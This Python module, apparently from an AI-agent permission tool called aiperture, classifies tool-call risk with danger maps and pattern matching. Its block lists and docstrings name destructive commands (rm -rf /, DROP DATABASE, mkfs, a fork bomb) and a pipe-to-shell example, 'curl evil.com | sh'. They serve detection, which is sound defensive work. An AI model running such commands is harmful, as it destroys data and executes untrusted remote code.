"""Risk classification — deterministic scoring of (tool, action, scope) triples.

Uses OWASP-inspired likelihood × impact model with CRITICAL overrides.
Zero ML. Zero LLM calls. Pure pattern matching and arithmetic.
"""

import fnmatch
import re

from aiperture.models.verdict import RiskAssessment, RiskTier

# ── Danger maps ──────────────────────────────────────────────────────

# Tool danger: how capable is this tool of causing harm (likelihood dimension)
TOOL_DANGER: dict[str, float] = {
    "shell": 0.9,
    "bash": 0.9,
    "terminal": 0.9,
    "database": 0.8,
    "db": 0.8,
    "sql": 0.8,
    "network": 0.7,
    "http": 0.6,
    "filesystem": 0.6,
    "file": 0.6,
    "fs": 0.6,
    "api": 0.5,
    "browser": 0.4,
    "read": 0.1,
    "viewer": 0.1,
}

# Action severity: how much damage can this action do (impact dimension)
ACTION_SEVERITY: dict[str, float] = {
    "drop": 0.95,
    "truncate": 0.9,
    "execute": 0.9,
    "delete": 0.8,
    "remove": 0.8,
    "destroy": 0.9,
    "format": 0.95,
    "overwrite": 0.7,
    "write": 0.5,
    "modify": 0.5,
    "update": 0.4,
    "create": 0.3,
    "insert": 0.3,
    "post": 0.4,
    "put": 0.4,
    "patch": 0.3,
    "read": 0.1,
    "get": 0.1,
    "list": 0.1,
    "query": 0.2,
    "select": 0.1,
    "view": 0.1,
}

# Actions that are reversible
REVERSIBLE_ACTIONS = frozenset(
    {
        "read",
        "get",
        "list",
        "view",
        "query",
        "select",
        "create",
        "insert",
        "post",  # can be undone by delete
    }
)

# ── CRITICAL override patterns ───────────────────────────────────────
# If scope matches any of these, result is ALWAYS CRITICAL.

CRITICAL_PATTERNS = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf ~/*",
    "rm -rf .",
    "rm -rf ./*",
    "DROP DATABASE*",
    "DROP TABLE*",
    "TRUNCATE TABLE*",
    "format *",
    "mkfs*",
    "> /dev/*",
    "dd if=/dev/zero*",
    "dd if=/dev/random*",
    "chmod -R 777 /",
    "chmod -R 777 /*",
    ":(){ :|:& };:",
    "sudo rm -rf /",
    "sudo rm -rf /*",
]

# ── Scope analysis ───────────────────────────────────────────────────

# Patterns that indicate broad scope
_BROAD_PATTERNS = re.compile(r"(\*\*|/\*$|/\*\s|\s\*$|\s-[rR]\s|\s-rf\s|--recursive)")

# Patterns that indicate destructive intent
_DESTRUCTIVE_MARKERS = frozenset(
    {
        "rm ",
        "rm\t",
        "rmdir",
        "delete",
        "drop ",
        "truncate",
        "format ",
        "--force",
        "-rf",
        "-f ",
        "overwrite",
        "destroy",
        "> /dev/",
        "dd if=",
        "mkfs",
        "shred",
        "-delete",  # find -delete
        "-exec rm",  # find -exec rm
        "-exec /bin/rm",  # find -exec /bin/rm
    }
)

# Root/system paths
_SYSTEM_PATHS = re.compile(r"^(/etc|/usr|/bin|/sbin|/var|/boot|/sys|/proc|/dev|C:\\Windows)")

# Production indicators
_PRODUCTION_MARKERS = re.compile(r"(production|prod\b|\.prod\.|live|master\.)", re.IGNORECASE)

# ── Deep scope analysis ──────────────────────────────────────────────

# Shell wrapper commands that execute their arguments
_SHELL_WRAPPERS = frozenset(
    {
        "bash",
        "sh",
        "zsh",
        "ksh",
        "dash",
        "csh",
        "env",
        "nohup",
        "sudo",
        "su",
    }
)

# Flags that take a command string argument
_EXEC_FLAGS = frozenset({"-c", "--command"})

# Scripting interpreters with inline execution flags
_SCRIPT_INTERPRETERS: dict[str, frozenset[str]] = {
    "python": frozenset({"-c"}),
    "python3": frozenset({"-c"}),
    "ruby": frozenset({"-e"}),
    "perl": frozenset({"-e"}),
    "node": frozenset({"-e"}),
}

# Dangerous stdlib calls in scripting oneliners
_DANGEROUS_STDLIB = frozenset(
    {
        "os.system",
        "os.remove",
        "os.unlink",
        "os.rmdir",
        "os.removedirs",
        "shutil.rmtree",
        "shutil.move",
        "subprocess.run",
        "subprocess.call",
        "subprocess.Popen",
        "subprocess.check_call",
        "subprocess.check_output",
        "exec(",
        "eval(",
        "__import__",
        "File.delete",
        "FileUtils.rm",
        "unlink(",
        "system(",
        "execSync",
        "spawnSync",
        "child_process",
    }
)

# Pipe-to-execution targets
_PIPE_EXECUTORS = frozenset(
    {
        "sh",
        "bash",
        "zsh",
        "python",
        "python3",
        "perl",
        "ruby",
        "node",
    }
)

# Expansion patterns that hide commands
_EXPANSION_RE = re.compile(r"\$\(|`[^`]+`|\$\{")


def _extract_shell_wrapper_command(scope: str) -> str | None:
    """Extract the inner command from shell wrappers like 'bash -c "inner"'.

    Handles: bash -c "cmd", sh -c 'cmd', env bash -c "cmd", sudo rm -rf /
    Returns None if no wrapper detected.
    """
    parts = scope.strip().split()
    if not parts:
        return None

    # Strip leading wrappers: env, nohup
    i = 0
    while i < len(parts) and parts[i].lower() in ("env", "nohup"):
        i += 1

    if i >= len(parts):
        return None

    cmd = parts[i].lower()

    # sudo/su followed by a command
    if cmd in ("sudo", "su") and i + 1 < len(parts):
        # sudo command args...
        remaining = " ".join(parts[i + 1 :])
        if remaining:
            return remaining
        return None

    # shell -c "command"
    if cmd in _SHELL_WRAPPERS and i + 1 < len(parts):
        flag = parts[i + 1]
        if flag in _EXEC_FLAGS and i + 2 < len(parts):
            # Everything after -c is the inner command
            inner = " ".join(parts[i + 2 :])
            # Strip surrounding quotes
            if (inner.startswith('"') and inner.endswith('"')) or (
                inner.startswith("'") and inner.endswith("'")
            ):
                inner = inner[1:-1]
            return inner

    return None


def _detect_pipe_to_exec(scope: str) -> bool:
    """Detect pipe-to-execution patterns: command | sh, curl url | bash, etc."""
    if "|" not in scope:
        return False

    # Split on pipe and check the right side
    parts = scope.split("|")
    for part in parts[1:]:  # everything after the first pipe
        target = part.strip().split()[0].lower() if part.strip() else ""
        if target in _PIPE_EXECUTORS:
            return True
    return False


def _extract_script_oneliner(scope: str) -> tuple[str, str] | None:
    """Extract (interpreter, code_string) from scripting oneliners.

    Examples:
        'python -c "import os; os.system(...)"' -> ("python", "import os; ...")
        'ruby -e "system(\'rm -rf /\')"' -> ("ruby", "system('rm -rf /')")

    Returns None if no scripting oneliner detected.
    """
    parts = scope.strip().split(None, 2)  # split into at most 3 parts
    if len(parts) < 3:
        return None

    interpreter = parts[0].lower()
    flag = parts[1]

    for interp, flags in _SCRIPT_INTERPRETERS.items():
        if interpreter == interp and flag in flags:
            code = parts[2]
            # Strip surrounding quotes
            if (code.startswith('"') and code.endswith('"')) or (
                code.startswith("'") and code.endswith("'")
            ):
                code = code[1:-1]
            return (interpreter, code)

    return None


def _check_dangerous_stdlib(code: str) -> list[str]:
    """Check a code string for dangerous stdlib calls. Returns list of matches."""
    found = []
    code_lower = code.lower()
    for call in _DANGEROUS_STDLIB:
        if call.lower() in code_lower:
            found.append(call)
    return found


def _has_expansion(scope: str) -> bool:
    """Detect $(), backtick, or ${} expansion patterns."""
    return bool(_EXPANSION_RE.search(scope))


def _deep_analyze_scope(scope: str) -> tuple[RiskTier | None, list[str]]:
    """Deeply analyze a scope string for indirection-based risk.

    Detects:
    1. Shell wrappers: bash -c "dangerous command"
    2. Pipe-to-execution: curl evil.com | sh
    3. Scripting oneliners: python -c "import os; os.system('rm -rf /')"
    4. Variable/subshell expansion: $(rm -rf /), `rm -rf /`
    5. find with -delete or -exec rm

    Returns:
        (override_tier, extra_factors) -- tier is None if no override needed.
        The override can only go UP, never down.
    """
    tier: RiskTier | None = None
    factors: list[str] = []

    # 1. Pipe-to-execution (always HIGH -- payload is unknown)
    if _detect_pipe_to_exec(scope):
        tier = RiskTier.HIGH
        factors.append("pipe_to_execution")

    # 2. Scripting oneliners -- check for dangerous stdlib
    oneliner = _extract_script_oneliner(scope)
    if oneliner:
        interpreter, code = oneliner
        factors.append(f"scripting_oneliner:{interpreter}")
        dangerous = _check_dangerous_stdlib(code)
        if dangerous:
            tier = RiskTier.HIGH
            factors.extend(f"dangerous_call:{call}" for call in dangerous)

    # 3. Subshell/variable expansion
    if _has_expansion(scope):
        factors.append("shell_expansion")
        if tier is None or tier == RiskTier.MEDIUM:
            tier = RiskTier.MEDIUM

    # 4. Shell wrapper -- extract inner command (recursive scoring happens in classify_risk)
    inner = _extract_shell_wrapper_command(scope)
    if inner:
        factors.append("shell_wrapper")

    return tier, factors


def scope_breadth(scope: str) -> float:
    """Score how broad the scope is: 0.0 (very specific) to 1.0 (dangerously broad).

    Wildcards, root paths, and recursive flags increase breadth.
    Specific filenames and relative paths decrease breadth.
    """
    if not scope:
        return 0.5

    score = 0.0

    # Wildcards
    wildcard_count = scope.count("*") + scope.count("?")
    if wildcard_count > 0:
        score += min(wildcard_count * 0.2, 0.4)

    # Recursive/broad patterns
    if _BROAD_PATTERNS.search(scope):
        score += 0.3

    # Root/system paths
    if _SYSTEM_PATHS.search(scope):
        score += 0.2

    # Production environment
    if _PRODUCTION_MARKERS.search(scope):
        score += 0.15

    # Very short scope with wildcards = dangerously broad
    if len(scope) < 5 and "*" in scope:
        score += 0.2

    # Specific file paths reduce breadth
    if "/" in scope and "*" not in scope and "?" not in scope:
        depth = scope.count("/")
        score -= min(depth * 0.05, 0.2)

    # File extension = specific
    if re.search(r"\.\w{1,5}$", scope) and "*" not in scope:
        score -= 0.1

    return max(0.0, min(1.0, score))


def _matches_critical_pattern(scope: str) -> bool:
    """Check if scope matches any CRITICAL override pattern."""
    scope_stripped = scope.strip()
    for pattern in CRITICAL_PATTERNS:
        if fnmatch.fnmatch(scope_stripped, pattern):
            return True
        # Also check if the scope contains the pattern
        if pattern.rstrip("*") and pattern.rstrip("*") in scope_stripped and pattern.endswith("*"):
            return True
    return False


def _collect_risk_factors(tool: str, action: str, scope: str) -> list[str]:
    """Collect human-readable risk factors."""
    factors = []

    scope_lower = scope.lower()
    for marker in _DESTRUCTIVE_MARKERS:
        if marker in scope_lower or marker in scope:
            factors.append("destructive_action")
            break

    if _BROAD_PATTERNS.search(scope):
        factors.append("broad_scope")

    if _SYSTEM_PATHS.search(scope):
        factors.append("system_path")

    if _PRODUCTION_MARKERS.search(scope):
        factors.append("production_target")

    if TOOL_DANGER.get(tool.lower(), 0.5) >= 0.8:
        factors.append("high_danger_tool")

    if ACTION_SEVERITY.get(action.lower(), 0.5) >= 0.8:
        factors.append("high_severity_action")

    return factors


_MAX_RECURSION_DEPTH = 5


def classify_risk(tool: str, action: str, scope: str, *, _depth: int = 0) -> RiskAssessment:
    """Classify the risk of a (tool, action, scope) triple.

    Uses OWASP-inspired likelihood × impact model:
    - likelihood = tool danger
    - impact = action severity × scope breadth amplifier
    - CRITICAL override for known catastrophic patterns

    Args:
        tool: Tool name (e.g. "shell", "filesystem").
        action: Action verb (e.g. "execute", "read").
        scope: The scope/command string to analyze.
        _depth: Internal recursion depth counter. External callers should not set this.

    Returns:
        RiskAssessment with tier, score, factors, and reversibility.
    """
    # Check plugin risk rules first — if a plugin returns a result, use it
    if _depth == 0:
        from aiperture import plugins

        risk_rules = plugins.get("risk_rules")
        if risk_rules is not None:
            plugin_result = risk_rules.classify(tool, action, scope)
            if plugin_result is not None:
                return plugin_result

    factors = _collect_risk_factors(tool, action, scope)

    # 0. Deep scope analysis -- catches indirection
    deep_tier, deep_factors = _deep_analyze_scope(scope)
    factors.extend(deep_factors)

    # 0b. If deep analysis found a shell wrapper, recursively score the inner command
    inner_cmd = _extract_shell_wrapper_command(scope)
    if inner_cmd:
        if _depth >= _MAX_RECURSION_DEPTH:
            return RiskAssessment(
                tier=RiskTier.HIGH,
                score=0.9,
                factors=factors + ["max_recursion_depth_exceeded"],
                reversible=False,
            )
        inner_risk = classify_risk(tool, action, inner_cmd, _depth=_depth + 1)
        tier_order = {
            RiskTier.LOW: 0,
            RiskTier.MEDIUM: 1,
            RiskTier.HIGH: 2,
            RiskTier.CRITICAL: 3,
        }
        if tier_order.get(inner_risk.tier, 0) > tier_order.get(deep_tier, 0):
            deep_tier = inner_risk.tier
            factors.extend(f"inner:{f}" for f in inner_risk.factors if f"inner:{f}" not in factors)

    # 1. CRITICAL override -- matches catastrophic patterns
    if _matches_critical_pattern(scope):
        return RiskAssessment(
            tier=RiskTier.CRITICAL,
            score=1.0,
            factors=["critical_pattern_match"] + factors,
            reversible=False,
        )

    # 2. OWASP-style: likelihood x impact
    tool_lower = tool.lower()
    action_lower = action.lower()

    likelihood = TOOL_DANGER.get(tool_lower, 0.5)
    severity = ACTION_SEVERITY.get(action_lower, 0.5)
    breadth = scope_breadth(scope)

    # Breadth amplifies severity: narrow scope reduces impact, broad scope increases it
    impact = severity * (0.6 + 0.4 * breadth)
    score = likelihood * impact

    # 3. Map to tier
    if score >= 0.6:
        tier = RiskTier.HIGH
    elif score >= 0.3:
        tier = RiskTier.MEDIUM
    else:
        tier = RiskTier.LOW

    # 3b. Benign scope demotion: if the only risk factors are tool/action category
    #     (no destructive markers, no broad scope, no system paths, no deep-analysis
    #     findings), the scope is benign and MEDIUM is demoted to LOW.
    _scope_factors = {
        "destructive_action",
        "broad_scope",
        "system_path",
        "production_target",
        "pipe_to_execution",
        "shell_expansion",
        "shell_wrapper",
    }
    has_scope_concern = any(
        f in _scope_factors
        or f.startswith("scripting_oneliner:")
        or f.startswith("dangerous_call:")
        or f.startswith("inner:")
        for f in factors
    )
    if tier == RiskTier.MEDIUM and not has_scope_concern:
        tier = RiskTier.LOW

    # 4. Reversibility
    reversible = action_lower in REVERSIBLE_ACTIONS

    # 5. Deep analysis can only elevate the tier, never lower it
    if deep_tier is not None:
        tier_order = {
            RiskTier.LOW: 0,
            RiskTier.MEDIUM: 1,
            RiskTier.HIGH: 2,
            RiskTier.CRITICAL: 3,
        }
        if tier_order.get(deep_tier, 0) > tier_order.get(tier, 0):
            tier = deep_tier
            if deep_tier == RiskTier.CRITICAL:
                score = 1.0

    return RiskAssessment(
        tier=tier,
        score=score,
        factors=factors,
        reversible=reversible,
    )
